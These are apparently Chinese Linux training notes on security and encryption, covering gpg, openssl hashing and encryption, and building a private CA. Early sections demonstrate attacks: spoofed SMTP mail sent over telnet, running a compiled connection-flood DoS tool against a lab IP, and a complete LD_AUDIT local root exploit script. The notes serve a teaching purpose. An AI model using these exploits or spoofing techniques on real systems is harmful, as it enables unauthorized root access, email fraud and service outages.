# 加密和安全

```
本章内容
安全机制
对称和非对称加密
散列算法
gpg
PKI和CA
openssl
证书管理
ssh服务和dropbear
轻量级自动化运维工具
aide
Sudo
TCP Wrappers
PAM模块
```

## 墨菲定律

```

墨菲定律：一种心理学效应，是由爱德华·墨菲（Edward A. Murphy）提出的，
原话：如果有两种或两种以上的方式去做某件事情，而其中一种选择方式将导
致灾难，则必定有人会做出这种选择
主要内容：
任何事都没有表面看起来那么简单
所有的事都会比你预计的时间长
会出错的事总会出错
如果你担心某种情况发生，那么它就更有可能发生
```

## 安全机制

```

信息安全防护的目标
保密性 Confidentiality
完整性 Integrity
可用性 Usability
可控制性 Controlability
不可否认性 Non-repudiation
安全防护环节
物理安全：各种设备/主机、机房环境
系统安全：主机或设备的操作系统
应用安全：各种网络服务、应用程序
网络安全：对网络访问的控制、防火墙规则
数据安全：信息的备份与恢复、加密解密
管理安全：各种保障性的规范、流程、方法
```

## 假冒邮件

```
[root@node1 ~]# telnet 127.0.0.1 25
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 node1.localdomain ESMTP Postfix
helo a.com
250 node1.localdomain
mail from: mayun@alibaba.com
250 2.1.0 Ok
rcpt to: wang
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: welcome to a alibaba
hi,wang
I am mayun
welcome to alibaba
.
250 2.0.0 Ok: queued as D80231002865
quit
221 2.0.0 Bye
Connection closed by foreign host.
[root@node1 ~]# 

```

## 接受邮件

```
[root@node1 ~]# su - wang
[wang@node1 ~]$ mail
Heirloom Mail version 12.5 7/5/10.  Type ? for help.
"/var/spool/mail/wang": 1 message 1 new
>N  1 mayun@alibaba.com     Wed Oct 28 10:37  16/491   "welcome to a alibaba"
& 1
Message  1:
From mayun@alibaba.com  Wed Oct 28 10:37:50 2020
Return-Path: <mayun@alibaba.com>
X-Original-To: wang
Delivered-To: wang@node1.localdomain
subject: welcome to a alibaba
Date: Wed, 28 Oct 2020 10:35:48 +0800 (CST)
From: mayun@alibaba.com
Status: R

hi,wang
I am mayun
welcome to alibaba

& 

```

## DOS攻击

```
[root@node2 ~]# gcc flood_connect.c -o dos
[root@node2 ~]# ll
total 52
-rw-------. 1 root root  1723 Aug 28 21:42 anaconda-ks.cfg
-rwxr-xr-x. 1 root root 23552 Oct 28 11:01 dos
-rw-r--r--. 1 root root 16483 Oct 28 10:55 flood_connect.c
-rw-r--r--. 1 root root  1754 Aug 28 22:08 initial-setup-ks.cfg
[root@node2 ~]# ./dos 192.168.0.103
Starting flood connect attack on 192.168.0.103 port 80

```

## httpd服务器不能连接

```
[root@node1 ~]# while true;do curl localhost;sleep 1;done

```

## 提升权限

```
crack.sh  适用于5的系统
[wang@node1 ~]$ cat crack.sh 
mkdir /tmp/wang
ln /bin/ping /tmp/wang/test
exec 3< /tmp/wang/test
rm -rf /tmp/wang
cat > /tmp/wang.c <<eof
void __attribute__((constructor)) init()
{
    setuid(0);
    system("/bin/bash");
}
eof

gcc -w -fPIC -shared -o /tmp/wang /tmp/wang.c
LD_AUDIT="$ORIGIN" exec /proc/self/fd/3 &> /dev/null
[wang@node1 ~]$ 

```

## 安全

```

安全攻击： STRIDE
Spoofing 假冒
Tampering 篡改
Repudiation 否认
Information Disclosure 信息泄漏
Denial of Service 拒绝服务
Elevation of Privilege 提升权限
```

## 安全设计基本原则

```

使用成熟的安全系统
以小人之心度输入数据
外部系统是不安全的
最小授权
减少外部接口
缺省使用安全模式
安全不是似是而非
从STRIDE思考
在入口处检查
从管理上保护好你的系统
```

## 安全算法

```

常用安全技术
认证
授权
审计
安全通信
加密算法和协议
对称加密
公钥加密
单向加密
认证协议
```

## 对称加密算法

```

对称加密：加密和解密使用同一个密钥
    DES：Data Encryption Standard，56bits
    3DES：
    AES：Advanced (128, 192, 256bits)
    Blowfish，Twofish
    IDEA，RC6，CAST5
特性：
1、加密、解密使用同一个密钥，效率高
2、将原始数据分割成固定大小的块，逐个进行加密
缺陷：
1、密钥过多
2、密钥分发
3、数据来源无法确认
```

## 非对称加密算法

```

公钥加密：密钥是成对出现
公钥：公开给所有人；public key
私钥：自己留存，必须保证其私密性；secret key
特点：用公钥加密数据，只能使用与之配对的私钥解密；反之亦然
功能：
数字签名：主要在于让接收方确认发送方身份
对称密钥交换：发送方用对方的公钥加密一个对称密钥后发送给对方
数据加密：适合加密较小数据
缺点：密钥长，加密解密效率低下
算法：
RSA（加密，数字签名）
DSA（数字签名）
ELGamal
```

## 非对称加密

```

基于一对公钥/密钥对
• 用密钥对中的一个加密，另一个解密
实现加密：
• 接收者
生成公钥/密钥对：P和S
公开公钥P，保密密钥S • 发送者
使用接收者的公钥来加密消息M 将P(M)发送给接收者
• 接收者
使用密钥S来解密：M=S(P(M))
```

## 非对称加密

```

实现数字签名：
• 发送者
生成公钥/密钥对：P和S
公开公钥P，保密密钥S
使用密钥S来加密消息M
发送给接收者S(M)
• 接收者
使用发送者的公钥来解密M=P(S(M))
结合签名和加密
分离签名
```

## RSA和DSA

```

RSA：公钥加密算法是1977年由Ron Rivest、Adi Shamirh和LenAdleman在
（美国麻省理工学院）开发的，RSA取名来自开发他们三者的名字，后成立RSA
数据安全有限公司。RSA是目前最有影响力的公钥加密算法，它能够抵抗到目
前为止已知的所有密码攻击，已被ISO推荐为公钥数据加密标准。RSA算法基于
一个十分简单的数论事实：将两个大素数相乘十分容易，但那时想要对其乘积
进行因式分解却极其困难，因此可以将乘积公开作为加密密钥
DSA (Digital Signature Algorithm)：1991年7月26日提交，并归属于David 
W. Kravitz前NSA员工，DSA是Schnorr和ElGamal签名算法的变种，被美国
NIST作为SS(DigitalSignature Standard)， DSA是基于整数有限域离散对数难
题的，其安全性与RSA相比差不多。DSA只是一种算法，和RSA不同之处在于
它不能用作加密和解密，也不能进行密钥交换，只用于签名,它比RSA要快很多
```

## 比较md5

```
[root@node1 ~]# md5sum /etc/fstab 
7be40c8f9db7ce7b52e7157bfd554b67  /etc/fstab
[root@node1 ~]# md5sum /etc/fstab > md5.log
[root@node1 ~]# vim /etc/fstab 
[root@node1 ~]# 
[root@node1 ~]# md5sum -c md5.log 
/etc/fstab: FAILED
md5sum: WARNING: 1 computed checksum did NOT match
[root@node1 ~]# vim /etc/fstab 
[root@node1 ~]# 
[root@node1 ~]# md5sum -c md5.log 
/etc/fstab: OK
[root@node1 ~]# 

```

## 对称加密文件

```
[root@node1 data]# gpg -c fstab 
gpg: directory `/root/.gnupg' created
gpg: new configuration file `/root/.gnupg/gpg.conf' created
gpg: WARNING: options in `/root/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/root/.gnupg/pubring.gpg' created
[root@node1 data]# ll
total 12
-rw-r--r--. 1 root root   0 Oct 28 13:51 f1
-rw-r--r--. 1 root root 477 Oct 28 13:55 fstab
-rw-r--r--. 1 root root 313 Oct 28 13:56 fstab.gpg
-rw-r--r--. 1 root root  11 Oct 28 13:51 txt
[root@node1 data]# scp fstab.gpg 192.168.0.104:/root/
The authenticity of host '192.168.0.104 (192.168.0.104)' can't be established.
ECDSA key fingerprint is SHA256:zpZvV9s9dFXUlE86N8SSqruRXqPu5cARuNtEX7v2dg8.
ECDSA key fingerprint is MD5:44:6b:2d:c0:f2:d8:a1:d1:48:30:34:5a:2b:79:f1:e1.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.104' (ECDSA) to the list of known hosts.
root@192.168.0.104's password: 
fstab.gpg                                                                                                      100%  313   552.4KB/s   00:00    
[root@node1 data]# 

```

## 对此解密文件

```
[root@node2 ~]# gpg -o fstab -d fstab.gpg 
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
[root@node2 ~]# ls
anaconda-ks.cfg  dos  flood_connect.c  fstab  fstab.gpg  initial-setup-ks.cfg
[root@node2 ~]# cat fstab

#
# /etc/fstab
# Created by anaconda on Thu Aug 27 20:50:19 2020
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/centos_node1-root /                       xfs     defaults        0 0
UUID=f7d1f48d-3bc9-4ef5-9ddb-6f8d7c20f3aa /boot                   xfs     defaults        0 0
/dev/mapper/centos_node1-swap swap                    swap    defaults        0 0
[root@node2 ~]# 

```

## 非对称密码生成

```
[root@node2 data]# gpg --gen-key
gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: directory `/root/.gnupg' created
gpg: new configuration file `/root/.gnupg/gpg.conf' created
gpg: WARNING: options in `/root/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/root/.gnupg/secring.gpg' created
gpg: keyring `/root/.gnupg/pubring.gpg' created
Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
Your selection? 
RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (2048) 
Requested keysize is 2048 bits
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0) 
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: magedu
Email address: admin@magedu.com
Comment: magedu key
You selected this USER-ID:
    "magedu (magedu key) <admin@magedu.com>"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O
You need a Passphrase to protect your secret key.

You don't want a passphrase - this is probably a *bad* idea!
I will do it anyway.  You can change your passphrase at any time,
using this program with the option "--edit-key".

We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 03C4E399 marked as ultimately trusted
public and secret key created and signed.

gpg: checking the trustdb
gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
pub   2048R/03C4E399 2020-10-28
      Key fingerprint = 8B69 BE01 2B2F 6740 6D70  1527 D56E 99BF 03C4 E399
uid                  magedu (magedu key) <admin@magedu.com>
sub   2048R/1C2F8989 2020-10-28

[root@node2 data]# 

```

## 存放目录

```
[root@node2 data]# ll /root/.gnupg/
total 28
-rw-------. 1 root root 7680 Oct 28 15:00 gpg.conf
drwx------. 2 root root    6 Oct 28 15:01 private-keys-v1.d
-rw-------. 1 root root 1198 Oct 28 15:01 pubring.gpg
-rw-------. 1 root root 1198 Oct 28 15:01 pubring.gpg~
-rw-------. 1 root root  600 Oct 28 15:01 random_seed
-rw-------. 1 root root 2499 Oct 28 15:01 secring.gpg
srwxr-xr-x. 1 root root    0 Oct 28 15:01 S.gpg-agent
-rw-------. 1 root root 1280 Oct 28 15:01 trustdb.gpg
[root@node2 data]# gpg --list-keys
/root/.gnupg/pubring.gpg
------------------------
pub   2048R/03C4E399 2020-10-28
uid                  magedu (magedu key) <admin@magedu.com>
sub   2048R/1C2F8989 2020-10-28


```

## 导出公钥

```
[root@node2 data]# gpg -a --export -o /data/magedu.pubkey
[root@node2 data]# ll
total 4
-rw-r--r--. 1 root root 1727 Oct 28 15:03 magedu.pubkey
[root@node2 data]# cat magedu.pubkey 
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v2.0.22 (GNU/Linux)

mQENBF+ZF0kBCACsrPhrJFNBogj1QUmrgaM7xmtl9o8ErADSYDfMSIe613+bHwhk
Hd3QVgRSKUyHQH6Q7hT31uPFtoiySI7RG3Ad3scWPZmu7kEWKSbkXwxr2ajTY7Ht
szF4L18xUSBsMABQiKf1MLjnZaRyyKmT/W2CpMSh/6Pxa/4gYIL3gLg3GDfeyvRM
Phee/NbVsZyQR1tOYUYRDMUjVYmbvpVHGpuve/XiH1iHB2tpLWU8fkV1Y14czmqB
Qi0CK1X1BLOcfiYQB7l21q1jiQ3rgGrYdiD6TGwAcLPz5rLglm/daRO330njx2yb
SQYcsfzyXuAvgyxmQc/zeGIEEfWGgDHPBCOrABEBAAG0Jm1hZ2VkdSAobWFnZWR1
IGtleSkgPGFkbWluQG1hZ2VkdS5jb20+iQE5BBMBAgAjBQJfmRdJAhsDBwsJCAcD
AgEGFQgCCQoLBBYCAwECHgECF4AACgkQ1W6ZvwPE45mywwf8CA6P9CiYcdyLNFdt
QLKcGpL/3VjESaB2GPM5PLeV26P7HUcguCcY2G+WCfqkKcJ1IFCgZypWdTs8oWDH
A6+hUVyTM5rKLl3zFbLPWOBvjv9cyYNlAqWhtxydWVVFyrnguOdXlz3xvLgGQcu6
CjFD1ZhWFWHiY16a5fQaaPW2cgk/O2h4avROJJxudrfOi2WqOQ//g+4xDWwDnL1H
aw4Ovg5HH4hFmWffvNKaxeDeytYMn+C6gXtvCFFSDzSduOLWowpK1NUykW7toR97
RuhT5d9W4Po1uEF1g0TUIq3xvXmbuIQj8ZmY1GygVKuEVStXcYjZP1mdqG5xqTzJ
CJe4fLkBDQRfmRdJAQgAyLqPXiFj9KmTv9whVKPHniGLO82NkvLvlYKMLSDXdiR8
jvvHBfeljmtsP2OzrcGq+Vp8T9pNzg+Y3pI8fvkHpHTMKuyIuFrtdcqwd95X9hUt
2L4Tg6uOIv9Y0t4ZtlQDzSwiOGtm7u8INK6+BsT3jrbvVKpfSgydjqJLz0a0qXxX
OZqmwrLqoCO80DY5edq/HUH0QV1RaqjrSNfvFhO6oh3oIGjHuQC8awo0uNP7g8bc
OyRfWDgPdWhNGIr8ggQdzd6YTJPJCmckoANwnRnC8JITMOPh9If99fz+na8C/WYT
KLK4nEM1xO4hUylJzhZNPq7R+2lRbg2gi+ZQznDCfQARAQABiQEfBBgBAgAJBQJf
mRdJAhsMAAoJENVumb8DxOOZwcwH/RSTnpbZUmnTytHhfQ1Cx/Tnj6zjtnMw8wxV
UtV6Ah5BjFNI0JpOa6yAi6ubSg5A0rd0F1Y5/WGPq0A6xxiBCFz8+OGkwHfKpUD7
thHOJPe7dzuoKQVYj1vq9fmJt70WBdG6BxsXZ4eHeP0RF4DrVKRd3IngAxx4j+Lr
sKgi9C6WAVR02L0DyvmT+/T9jQqqJh8Tqs/+O682o1rxy1A9uaPIoDQGFktdjMdz
Ytk1JNLXDa8EJqr+blfEOePrxDNn7dOop6geYFG+5z3zqx05HAGuTHfQOFHBn97U
Do71RkWCiQZDZo+An5YTfh4xf1VfMnu13bkqx/Si9Ymno89amtc=
=sx0V
-----END PGP PUBLIC KEY BLOCK-----
[root@node2 data]# scp magedu.pubkey 192.168.0.103:/data/


```

## 导入公钥

```
[root@node1 data]# gpg --list-keys
[root@node1 data]# gpg --import magedu.pubkey 
gpg: key 03C4E399: public key "magedu (magedu key) <admin@magedu.com>" imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
[root@node1 data]# gpg --list-keys
/root/.gnupg/pubring.gpg
------------------------
pub   2048R/03C4E399 2020-10-28
uid                  magedu (magedu key) <admin@magedu.com>
sub   2048R/1C2F8989 2020-10-28

[root@node1 data]# 

生成自己的私钥文件


[root@node1 data]# gpg --gen-key
gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
Your selection? 
RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (2048) 
Requested keysize is 2048 bits
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0) 
Key does not expire at all
Is this correct? (y/N) 
Key is valid for? (0) 
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: wange
Email address: wange@magedu.com
Comment: wange key
You selected this USER-ID:
    "wange (wange key) <wange@magedu.com>"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O
You need a Passphrase to protect your secret key.

You don't want a passphrase - this is probably a *bad* idea!
I will do it anyway.  You can change your passphrase at any time,
using this program with the option "--edit-key".

We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: key 57E905D3 marked as ultimately trusted
public and secret key created and signed.

gpg: checking the trustdb
gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
pub   2048R/57E905D3 2020-10-28
      Key fingerprint = 4B77 50DD 4AF6 D9A0 C0EB  7B6E F124 E1CA 57E9 05D3
uid                  wange (wange key) <wange@magedu.com>
sub   2048R/9BAC21AA 2020-10-28

[root@node1 .gnupg]# ll -h secring.gpg 
-rw-------. 1 root root 2.5K Oct 28 15:07 secring.gpg
[root@node1 .gnupg]# 


```

## 加密文件

```
[root@node1 .gnupg]# 
[root@node1 .gnupg]# cd /data/
[root@node1 data]# cp /etc/fstab .
[root@node1 data]# ls
fstab  magedu.pubkey
[root@node1 data]# gpg -e -r magedu fstab 
gpg: 1C2F8989: There is no assurance this key belongs to the named user

pub  2048R/1C2F8989 2020-10-28 magedu (magedu key) <admin@magedu.com>
 Primary key fingerprint: 8B69 BE01 2B2F 6740 6D70  1527 D56E 99BF 03C4 E399
      Subkey fingerprint: A9AF 3EEE 8520 4DAB FBD3  95FC 92F9 C355 1C2F 8989

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
[root@node1 data]# ll
total 12
-rw-r--r--. 1 root root  477 Oct 28 15:10 fstab
-rw-r--r--. 1 root root  607 Oct 28 15:11 fstab.gpg
-rw-r--r--. 1 root root 1727 Oct 28 15:04 magedu.pubkey
[root@node1 data]# scp fstab.gpg 192.168.0.104:/data/
The authenticity of host '192.168.0.104 (192.168.0.104)' can't be established.
ECDSA key fingerprint is SHA256:zpZvV9s9dFXUlE86N8SSqruRXqPu5cARuNtEX7v2dg8.
ECDSA key fingerprint is MD5:44:6b:2d:c0:f2:d8:a1:d1:48:30:34:5a:2b:79:f1:e1.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.104' (ECDSA) to the list of known hosts.
root@192.168.0.104's password: 
fstab.gpg                                                                                                      100%  607   838.8KB/s   00:00    
[root@node1 data]# 

```

## 解密文件

```
[root@node2 data]# gpg -o fstab -d fstab.gpg 
gpg: encrypted with 2048-bit RSA key, ID 1C2F8989, created 2020-10-28
      "magedu (magedu key) <admin@magedu.com>"
[root@node2 data]# ll
total 12
-rw-r--r--. 1 root root  477 Oct 28 15:13 fstab
-rw-r--r--. 1 root root  607 Oct 28 15:11 fstab.gpg
-rw-r--r--. 1 root root 1727 Oct 28 15:03 magedu.pubkey
[root@node2 data]# 

```

## 删除公钥

```
[root@node1 data]# gpg --list-keys
/root/.gnupg/pubring.gpg
------------------------
pub   2048R/03C4E399 2020-10-28
uid                  magedu (magedu key) <admin@magedu.com>
sub   2048R/1C2F8989 2020-10-28

pub   2048R/57E905D3 2020-10-28
uid                  wange (wange key) <wange@magedu.com>
sub   2048R/9BAC21AA 2020-10-28

[root@node1 data]# gpg --delete-keys magedu
gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


pub  2048R/03C4E399 2020-10-28 magedu (magedu key) <admin@magedu.com>

Delete this key from the keyring? (y/N) y

```

## 删除私钥

```
[root@node1 data]# gpg --delete-secret-keys wange
gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


sec  2048R/57E905D3 2020-10-28 wange (wange key) <wange@magedu.com>

Delete this key from the keyring? (y/N) y
This is a secret key! - really delete? (y/N) y
[root@node1 data]# 

```

## 删除公钥

```
[root@node1 data]# gpg --delete-keys wange
gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


pub  2048R/57E905D3 2020-10-28 wange (wange key) <wange@magedu.com>

Delete this key from the keyring? (y/N) y
[root@node1 data]# 

```

## 文件大小 pubring.gpg和secring.gpg都为0

```
[root@node1 data]# ll /root/.gnupg/
total 20
-rw-------. 1 root root 7680 Oct 28 14:59 gpg.conf
drwx------. 2 root root    6 Oct 28 15:07 private-keys-v1.d
-rw-------. 1 root root    0 Oct 28 15:19 pubring.gpg
-rw-------. 1 root root 1196 Oct 28 15:16 pubring.gpg~
-rw-------. 1 root root  600 Oct 28 15:11 random_seed
-rw-------. 1 root root    0 Oct 28 15:18 secring.gpg
srwxr-xr-x. 1 root root    0 Oct 28 15:07 S.gpg-agent
-rw-------. 1 root root 1280 Oct 28 15:19 trustdb.gpg
[root@node1 data]# 

```

## 采用des3 对称加密

```
[root@node1 data]# openssl enc -e -des3 -a -in fstab -out fstab.enc
enter des-ede3-cbc encryption password:
Verifying - enter des-ede3-cbc encryption password:
[root@node1 data]# ll
total 8
-rw-r--r--. 1 root root 477 Oct 28 17:17 fstab
-rw-r--r--. 1 root root 675 Oct 28 17:18 fstab.enc
[root@node1 data]# 
[root@node1 data]# cat fstab

#
# /etc/fstab
# Created by anaconda on Thu Aug 27 20:50:19 2020
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/centos_node1-root /                       xfs     defaults        0 0
UUID=f7d1f48d-3bc9-4ef5-9ddb-6f8d7c20f3aa /boot                   xfs     defaults        0 0
/dev/mapper/centos_node1-swap swap                    swap    defaults        0 0
[root@node1 data]# cat fstab.enc 
U2FsdGVkX1+RBsBZApguzKC48VnOyxNMj39Y7yVFZGsHehmuUB+jn06FNx9uObaZ
IroC1j+xNyI91Iar8LMb0vmqo/7xIztq8JBoSVg59I5gqSsUh/5Fe4Z8RK1MqK9e
i1GVxBRKk+bsR2bfYnAa0Mu6erA2XDZsWVGC/7glm3eQvIpYFJwd9hrQltzdPzS5
CXJp17PeiHSFFvaRtPxDOiCO2dPnVDKl96d8hj48WHV1b+j2EdqMZ39DDNJULnPn
TNa8micoZpIzEJ/eRqZGUHcDEEVYv8mPHscYEqgb2qWazV2kuFivxD3N1pHuMSiY
Z52fQEEseVumTE9oXCbvLc8+sd7y7LC6R2Pn/3EsBac2dALbAn9NSYKboRZh5YhE
6MxbkiefrNKIkNoXJm8MvqHbc+bhWAtulYVBkbPtBmO0kKH+sCOZ4TfN4qf0Xdms
H6fCFTzEbPpPRmkuETKNROXCTCLwKHsV9sZPi1jyCcbXRibfWJqM+bwlwhtyiEa3
dhDY6wc/Ug1tps8IdF0nXn1AK14+T0ensjLi+231KESs2CT7x7ghzURFhRZFN1MZ
Do+lH2Jx9hPBviPiErQqbCPQaHI96CwWakNsCDW2A9G6pnQJzQBy1mMGVKbSGDTN
I6X8JvtXlAYytGHbH8P9YQ==

```

## 解密

```
[root@node1 data]# openssl enc -d -a -des3 -in fstab.enc 
enter des-ede3-cbc decryption password:

#
# /etc/fstab
# Created by anaconda on Thu Aug 27 20:50:19 2020
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/centos_node1-root /                       xfs     defaults        0 0
UUID=f7d1f48d-3bc9-4ef5-9ddb-6f8d7c20f3aa /boot                   xfs     defaults        0 0
/dev/mapper/centos_node1-swap swap                    swap    defaults        0 0
[root@node1 data]# 

```

## 单项加密

```
[root@node1 data]# openssl dgst -md5 fstab
MD5(fstab)= 7be40c8f9db7ce7b52e7157bfd554b67
[root@node1 data]# md5sum fstab
7be40c8f9db7ce7b52e7157bfd554b67  fstab
[root@node1 data]# 

```

```
[root@node1 data]# openssl dgst -sha512 fstab
SHA512(fstab)= ec220dcfd51be7455c7b053e86d116edb30388499b235f22ed6d0d421ea65972116556e042f7222e2434ad564804f9ae256473d96d4eacbcd1f807a332452ff7
[root@node1 data]# sha512sum fstab
ec220dcfd51be7455c7b053e86d116edb30388499b235f22ed6d0d421ea65972116556e042f7222e2434ad564804f9ae256473d96d4eacbcd1f807a332452ff7  fstab
[root@node1 data]# 

```

## md5加密

```
[root@node1 data]# openssl passwd -1 -salt "shao"
Password: 
$1$shao$gV7ZvRkxZ3H9JMVTGWl10/
[root@node1 data]# openssl passwd -1 -salt "shao"
Password: 
$1$shao$gV7ZvRkxZ3H9JMVTGWl10/
[root@node1 data]# 

```

## base64

```
[root@node1 data]# openssl rand -base64  12
g6Q1QGJem7a4+ZKB
[root@node1 data]# openssl rand -base64  12
92rMzDb1Jdj6tCNs
[root@node1 data]# openssl rand -hex 12
d20deb905e763bc2313c8f78
[root@node1 data]# 
[root@node1 data]# openssl rand -hex 12
b51a9657d532285d9fac8be1
[root@node1 data]# 

```

```
[root@node1 data]# echo -n ab |base64
YWI=
[root@node1 data]# 

```

## 生成私钥

```
[root@node1 data]# (umask 066;openssl genrsa -out test.key 2048)
Generating RSA private key, 2048 bit long modulus
..............................+++
................+++
e is 65537 (0x10001)
[root@node1 data]# ll
total 4
-rw-------. 1 root root 1679 Oct 28 18:43 test.key
[root@node1 data]# 

```

## 提出公钥

```
[root@node1 data]# openssl rsa -in test.key -pubout -out test.key.pub
writing RSA key
[root@node1 data]# ll
total 8
-rw-------. 1 root root 1679 Oct 28 18:43 test.key
-rw-r--r--. 1 root root  451 Oct 28 18:45 test.key.pub
[root@node1 data]# 

```

## 建立私有CA

```

1.私钥文件

[root@node1 CA]# (umask 066;openssl genrsa -out private/cakey.pem 4096)
Generating RSA private key, 4096 bit long modulus
...................................................................................................++
..............++
e is 65537 (0x10001)
[root@node1 CA]# 

```

## 自签证书

```
[root@node1 CA]# openssl req -new -x509 -key private/cakey.pem -out cacert.pem -days 3650 <<EOF
> CN
> beijing
> beijing
> magedu
> devops
> ca.magedu.com
> admin@magedu.com
> EOF
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:State or Province Name (full name) []:Locality Name (eg, city) [Default City]:Organization Name (eg, company) [
Default Company Ltd]:Organizational Unit Name (eg, section) []:Common Name (eg, your name or your server's hostname) []:Email Address []:[root@node1 CA]# [root@node1 CA]# 
[root@node1 CA]# 
[root@node1 CA]# touch /etc/pki/CA/index.txt
[root@node1 CA]# touch /etc/pki/CA/serial
[root@node1 CA]# echo 01 > /etc/pki/CA/serial


```

## 查看证书内容

```
[root@node1 CA]# openssl x509 -in cacert.pem -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            cd:68:bc:28:45:d8:10:6f
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=CN, ST=beijing, L=beijing, O=magedu, OU=devops, CN=ca.magedu.com/emailAddress=admin@magedu.com
        Validity
            Not Before: Oct 28 11:13:52 2020 GMT
            Not After : Oct 26 11:13:52 2030 GMT
        Subject: C=CN, ST=beijing, L=beijing, O=magedu, OU=devops, CN=ca.magedu.com/emailAddress=admin@magedu.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (4096 bit)
                Modulus:

```

## 客户端生成私钥

```
[root@node2 ~]# mkdir /data/app
[root@node2 ~]# cd /data/app
[root@node2 app]# (umask 066;openssl genrsa -out app.key 1024)
Generating RSA private key, 1024 bit long modulus
.......++++++
.......++++++
e is 65537 (0x10001)
[root@node2 app]# ll
total 4
-rw-------. 1 root root 891 Oct 28 19:22 app.key
[root@node2 app]# 

```

## 证书请求文件生成

```
[root@node2 app]# openssl req -new -key app.key -out app.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:beijing
Locality Name (eg, city) [Default City]:beijing
Organization Name (eg, company) [Default Company Ltd]:magedu
Organizational Unit Name (eg, section) []:app
Common Name (eg, your name or your server's hostname) []:app.magedu.com
Email Address []:app@magedu.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
[root@node2 app]# 
[root@node2 app]# ll
total 8
-rw-r--r--. 1 root root 696 Oct 28 19:28 app.csr
-rw-------. 1 root root 891 Oct 28 19:22 app.key
[root@node2 app]# 
[root@node2 app]# scp app.csr 192.168.0.103:/data
root@192.168.0.103's password: 
app.csr                                                                                                        100%  696   894.5KB/s   00:00    
[root@node2 app]# 


```

## 颁发证书

```
[root@node1 CA]# openssl ca -in /data/app.csr -out certs/app.crt -days 100
Using configuration from /etc/pki/tls/openssl.cnf
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: 1 (0x1)
        Validity
            Not Before: Oct 28 11:33:58 2020 GMT
            Not After : Feb  5 11:33:58 2021 GMT
        Subject:
            countryName               = CN
